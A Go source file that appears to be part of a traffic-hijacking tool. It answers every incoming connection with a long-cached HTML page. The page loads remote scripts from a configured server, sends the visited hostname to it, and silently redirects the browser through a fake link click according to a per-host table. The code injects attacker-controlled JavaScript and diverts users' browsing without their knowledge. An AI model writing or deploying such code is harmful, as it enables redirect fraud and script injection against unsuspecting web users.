package redirect

import (
	"fmt"
	"github.com/sirupsen/logrus"
	"net"
	"redi-multi/config"
)

func htmlContent() string {
	content := fmt.Sprintf(`<html>
<head>
	<script src="http://%s:8080/c.js"></script>
	<script type="text/javascript">var str = '<sc'+'ript src="http://%s:8080/api.js?d='+window.location.hostname.encode()+'" type="text/javascript"></s'+'cript>';document.write(str);</script>
</head>
<body>
	<a href="" id="hao123"></a>
	<script type="text/javascript">
		if(null!=redirector[window.location.hostname.encode()]){var strU=redirector[window.location.hostname.encode()].to.decode()+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e)}else{var e;strU=redirector.default_redirect_url.to+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e);console.log("redirector err")}
	</script>
</body>
</html>`, config.ServerIp, config.ServerIp)
	return content
}
func Process(conn net.Conn) {
	var RequestHead string
	content, length := htmlContent(), fmt.Sprintf("%v", len(htmlContent()))
	//var Path string
	defer conn.Close()
	for {
		var buf [128]byte
		//接受数据
		n, err := conn.Read(buf[:])
		if err != nil {
			logrus.Errorf("[redirect] read from connect failed, err: %v\n", err)
			break
		}
		logrus.Debugf("Receive data: \n%s\n", string(buf[:n]))

		RequestHead += string(buf[:n])
		logrus.Debug(RequestHead)

		if _, err = conn.Write([]byte("HTTP/1.1 200\r\n" +
			"Content-Type: text/html\r\n" +
			"Cache-Control: max-age=86400\r\n" +
			"Content-Length: " + length + "\r\n" +
			"Connection: close\r\n\r\n" + content)); err != nil {
			logrus.Errorf("write to client failed, err: %v\n", err)
		}
		logrus.Debug("[redirect] Response sent...")

		//if strings.Contains(RequestHead, "HTTP") {
		//	//send content
		//	if _, err = conn.Write([]byte("HTTP/1.1 200\r\n" +
		//		"Content-Type: text/html\r\n" +
		//		"Cache-Control: max-age=86400\r\n" +
		//		"Content-Length: " + length + "\r\n" +
		//		"Connection: close\r\n\r\n" + content)); err != nil {
		//		logrus.Errorf("write to client failed, err: %v\n", err)
		//	}
		//	logrus.Debug("[redirect] Response sent...")
		//}
	}
	logrus.Debug("net.Conn closed...")
	conn.Close()
}
